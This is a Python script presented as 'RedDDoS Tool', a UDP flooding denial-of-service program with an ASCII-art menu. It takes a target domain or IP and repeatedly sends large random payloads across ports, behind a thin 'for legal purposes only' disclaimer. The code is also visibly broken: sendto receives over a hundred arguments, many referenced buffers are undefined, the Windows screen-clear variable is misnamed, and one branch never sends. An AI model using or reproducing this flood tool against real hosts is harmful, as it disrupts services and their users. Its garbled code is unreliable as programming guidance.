# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "2.0"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1)
bytes141 = random._urandom(100176)
bytes142 = random._urandom(150176)
bytes143 = random._urandom(250176)
bytes144 = random._urandom(350176)
bytes145 = random._urandom(450176)
bytes146 = random._urandom(550176)
bytes147 = random._urandom(650176)
bytes148 = random._urandom(750176)
bytes149 = random._urandom(850176)
bytes150 = random._urandom(950176)
bytes151 = random._urandom(1250176)
bytes152 = random._urandom(1450176)
bytes153 = random._urandom(1550176)
bytes154 = random._urandom(2550176)
bytes155 = random._urandom(3550176)
bytes3 = random._urandom(4550176)
bytes4 = random._urandom(5550176)
bytes156 = random._urandom(6550176)
bytes157 = random._urandom(7550176)
bytes158 = random._urandom(8550176)
bytes159 = random._urandom(9550176)
bytes160 = random._urandom(10550176)
bytes161 = random._urandom(12550176)
bytes162 = random._urandom(14550176)
bytes163 = random._urandom(15550176)
bytes164 = random._urandom(25550176)
bytes165 = random._urandom(35550176)
bytes166 = random._urandom(45550176)
bytes167 = random._urandom(55550176)
bytes168 = random._urandom(65550176)
bytes5 = random._urandom(0)
bytes6 = random._urandom(1)
bytes7 = random._urandom(2)
bytes8 = random._urandom(3)
bytes9 = random._urandom(4)
bytes10 = random._urandom(5)
bytes11 = random._urandom(6)
bytes12 = random._urandom(7)
bytes13 = random._urandom(8)
bytes14 = random._urandom(9)
bytes15 = random._urandom(10)
bytes16 = random._urandom(1)
bytes17 = random._urandom(2)
bytes18 = random._urandom(3)
bytes19 = random._urandom(4)
bytes20 = random._urandom(5)
bytes21 = random._urandom(6)
bytes22 = random._urandom(7)
bytes23 = random._urandom(8)
bytes24 = random._urandom(9)
bytes25 = random._urandom(10)
bytes26 = random._urandom(2)
bytes27 = random._urandom(3)
bytes28 = random._urandom(4)
bytes29 = random._urandom(5)
bytes30 = random._urandom(6)
bytes31 = random._urandom(7)
bytes32 = random._urandom(8)
bytes33 = random._urandom(9)
bytes34 = random._urandom(10)
bytes35 = random._urandom(3)
bytes36 = random._urandom(4)
bytes37 = random._urandom(5)
bytes38 = random._urandom(6)
bytes39 = random._urandom(7)
bytes40 = random._urandom(8)
bytes41 = random._urandom(9)
bytes42 = random._urandom(10)
bytes43 = random._urandom(4)
bytes44 = random._urandom(5)
bytes45 = random._urandom(6)
bytes46 = random._urandom(7)
bytes47 = random._urandom(8)
bytes48 = random._urandom(9)
bytes49 = random._urandom(10)
bytes50 = random._urandom(5)
bytes51 = random._urandom(6)
bytes52 = random._urandom(7)
bytes53 = random._urandom(8)
bytes54 = random._urandom(9)
bytes55 = random._urandom(10)
bytes56 = random._urandom(6)
bytes57 = random._urandom(7)
bytes58= random._urandom(8)
bytes59= random._urandom(9)
bytes60 = random._urandom(10)
bytes61 = random._urandom(7)
bytes62 = random._urandom(8)
bytes63 = random._urandom(9)
bytes64 = random._urandom(10)
bytes65 = random._urandom(8)
bytes66 = random._urandom(9)
bytes67 = random._urandom(10)
bytes68 = random._urandom(9)
bytes69 = random._urandom(10)
bytes74 = random._urandom(10)
bytes75 = random._urandom(9)
bytes76 = random._urandom(8)
bytes77 = random._urandom(7)
bytes78 = random._urandom(6)
bytes79 = random._urandom(5)
bytes80 = random._urandom(4)
bytes81 = random._urandom(3)
bytes82 = random._urandom(2)
bytes83 = random._urandom(1)
bytes84 = random._urandom(0)
bytes85 = random._urandom(9)
bytes86 = random._urandom(8)
bytes87 = random._urandom(7)
bytes88 = random._urandom(6)
bytes89 = random._urandom(5)
bytes90 = random._urandom(4)
bytes91 = random._urandom(3)
bytes92 = random._urandom(2)
bytes93 = random._urandom(1)
bytes94 = random._urandom(0)
bytes95 = random._urandom(8)
bytes96 = random._urandom(7)
bytes97 = random._urandom(6)
bytes98 = random._urandom(5)
bytes99 = random._urandom(4)
bytes100 = random._urandom(3)
bytes101 = random._urandom(2)
bytes102 = random._urandom(1)
bytes103 = random._urandom(0)
bytes104 = random._urandom(7)
bytes105 = random._urandom(6)
bytes106 = random._urandom(5)
bytes107 = random._urandom(4)
bytes108 = random._urandom(3)
bytes109 = random._urandom(2)
bytes110 = random._urandom(1)
bytes111 = random._urandom(0)
bytes112 = random._urandom(6)
bytes113 = random._urandom(5)
bytes114 = random._urandom(4)
bytes115 = random._urandom(3)
bytes116 = random._urandom(2)
bytes117 = random._urandom(1)
bytes118 = random._urandom(0)
bytes119 = random._urandom(5)
bytes120 = random._urandom(4)
bytes121 = random._urandom(3)
bytes122 = random._urandom(2)
bytes123 = random._urandom(1)
bytes124 = random._urandom(0)
bytes125 = random._urandom(4)
bytes126 = random._urandom(3)
bytes127 = random._urandom(2)
bytes128 = random._urandom(1)
bytes129 = random._urandom(0)
bytes130 = random._urandom(3)
bytes131 = random._urandom(2)
bytes132 = random._urandom(1)
bytes133 = random._urandom(0)
bytes134 = random._urandom(2)
bytes135 = random._urandom(1)
bytes136 = random._urandom(0)
bytes137 = random._urandom(1)
bytes138 = random._urandom(0)

# SekeltonBOTNET
while True:
    # UI.
    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                        Author: Mr.\033[91mRed\033[0m")
    print("       Github: https://github.com/Red-company/RDDoS_Tool")
    print('                   For legal purposes only')
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
        print("RedDDoS Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
        print("other devices with it.                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
        print("                                                         \033[92m'-._____.-'\033[0m")
        print("Author of the program is not responsible for")
        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-00000002'")
        print("legit cases.")
        print("\nFor more information visit project's site.")
        
        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

sent_mode = False # If 'False' all ports will be use, if 'True' - certain.
sent = 2

while 1:
    sent_bool = str(input("Sent Packet? [y/n]: "))

    if (sent_bool == "y") or (sent_bool == "Y"):
        sent_mode = True
        sent = int(input("Sent Packet: "))
        break

    elif (sent_bool == "n") or (sent_bool == "N"):
        break

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes,bytes2,bytes3,bytes4,bytes5,bytes6,bytes7,bytes8,bytes9,bytes10,bytes11,bytes12,bytes13,bytes14,bytes15,bytes16,bytes17,bytes18,bytes19,bytes20,bytes21,bytes22,bytes23,bytes24,bytes25,bytes26,bytes27,bytes28,bytes29,bytes30,bytes31,bytes32,bytes33,bytes34,bytes35,bytes36,bytes37,bytes38,bytes39,bytes40,bytes41,bytes42,bytes43,bytes44,bytes45,bytes46,bytes47,bytes48,bytes49,bytes50,bytes51,bytes52,bytes53,bytes54,bytes55,bytes56,bytes57,bytes58,bytes59,bytes60,bytes61,bytes62,bytes63,bytes64,bytes65,bytes66,bytes67,bytes68,bytes69,bytes70,bytes71,bytes72,bytes73,bytes74,bytes75,bytes76,bytes77,bytes78,bytes79,bytes80,bytes81,bytes82,bytes83,bytes84,bytes85,bytes86,bytes87,bytes88,bytes89,bytes90,bytes91,bytes92,bytes93,bytes94,bytes95,bytes96,bytes97,bytes98,bytes99,bytes100,bytes101,bytes102,bytes103,bytes104,bytes105,bytes106,bytes107,bytes108,bytes109,bytes110,bytes111,bytes112,bytes113,bytes114,bytes115,bytes116,bytes117,bytes118,bytes119,bytes120,bytes121,bytes122,bytes123,bytes124,bytes125,bytes126,bytes127,bytes128,bytes129,bytes130,bytes131,bytes132,bytes133,bytes134,bytes135,bytes136,bytes137,bytes138,bytes139,bytes140,bytes141,bytes142,bytes143,bytes144,bytes145,bytes146,bytes147,bytes148,bytes149,bytes150,bytes151,bytes152,bytes153,bytes154,bytes155,bytes156,bytes157,bytes158,bytes159,bytes160,bytes161,bytes162,bytes163,bytes164,bytes165,bytes166,bytes167,bytes168, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif sent_mode == True: # Certain sent.
    if sent < 2:
        sent = 2
        
    elif sent == 999999999999999999999999:
        sent = 2

    elif sent == 10088118:
        sent = 10088188

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

elif sent_mode == True: # Certain sent.
    if sent < 2:
        sent = 2
        
    elif sent == 999999999999999999999999:
        sent = 2

    elif sent == 10088118:
        sent = 10088188

    try:
        while True:
            sock.sendto(bytes,bytes2,bytes3,bytes4,bytes5,bytes6,bytes7,bytes8,bytes9,bytes10,bytes11,bytes12,bytes13,bytes14,bytes15,bytes16,bytes17,bytes18,bytes19,bytes20,bytes21,bytes22,bytes23,bytes24,bytes25,bytes26,bytes27,bytes28,bytes29,bytes30,bytes31,bytes32,bytes33,bytes34,bytes35,bytes36,bytes37,bytes38,bytes39,bytes40,bytes41,bytes42,bytes43,bytes44,bytes45,bytes46,bytes47,bytes48,bytes49,bytes50,bytes51,bytes52,bytes53,bytes54,bytes55,bytes56,bytes57,bytes58,bytes59,bytes60,bytes61,bytes62,bytes63,bytes64,bytes65,bytes66,bytes67,bytes68,bytes69,bytes70,bytes71,bytes72,bytes73,bytes74,bytes75,bytes76,bytes77,bytes78,bytes79,bytes80,bytes81,bytes82,bytes83,bytes84,bytes85,bytes86,bytes87,bytes88,bytes89,bytes90,bytes91,bytes92,bytes93,bytes94,bytes95,bytes96,bytes97,bytes98,bytes99,bytes100,bytes101,bytes102,bytes103,bytes104,bytes105,bytes106,bytes107,bytes108,bytes109,bytes110,bytes111,bytes112,bytes113,bytes114,bytes115,bytes116,bytes117,bytes118,bytes119,bytes120,bytes121,bytes122,bytes123,bytes124,bytes125,bytes126,bytes127,bytes128,bytes129,bytes130,bytes131,bytes132,bytes133,bytes134,bytes135,bytes136,bytes137,bytes138,bytes139,bytes140,bytes141,bytes142,bytes143,bytes144,bytes145,bytes146,bytes147,bytes148,bytes149,bytes150,bytes151,bytes152,bytes153,bytes154,bytes155,bytes156,bytes157,bytes158,bytes159,bytes160,bytes161,bytes162,bytes163,bytes164,bytes165,bytes166,bytes167,bytes168, (ip, port))
            sent += 1
            port +=1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
